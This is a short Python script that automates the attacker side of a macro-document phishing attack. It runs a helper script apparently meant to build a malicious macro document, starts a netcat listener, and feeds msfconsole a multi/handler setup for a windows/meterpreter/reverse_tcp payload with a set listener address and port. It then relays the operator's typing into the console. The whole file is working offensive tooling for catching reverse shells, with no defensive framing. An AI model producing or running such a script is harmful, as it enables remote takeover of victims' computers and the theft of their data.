import subprocess
import os
import time
import re
import threading

def generate_vba_function():
    my_ip = "10.1.1.1"
    my_port = 8339
    subprocess.run(['./generate_macro_doc.sh'])
    return my_ip, my_port

def start_netcat_listener(port):
    nc_process = subprocess.run(['nc', '-lvp', str(port)], text=True)
    return nc_process

def start_linux_commands_to_console(my_ip, my_port):
    msf_command = f"""\
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {my_ip}
set LPORT {my_port}
exploit -j -z

"""

    msf_process = subprocess.Popen(['msfconsole'], stdin=subprocess.PIPE, text=True)
    msf_process.stdin.write(msf_command)
    msf_process.stdin.flush()

    return msf_process

def main():
    my_ip, my_port = generate_vba_function()
    nc_port = 4444  # Change this port number as needed

    # Start netcat listener in a separate thread
    nc_thread = threading.Thread(target=start_netcat_listener, args=(nc_port,))
    nc_thread.start()

    # Start Metasploit console
    msf_process = start_linux_commands_to_console(my_ip, my_port)

    # Allow the user to interact with the Metasploit console
    while True:
        try:
            user_input = input()
            msf_process.stdin.write(user_input + "\n")
            msf_process.stdin.flush()
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
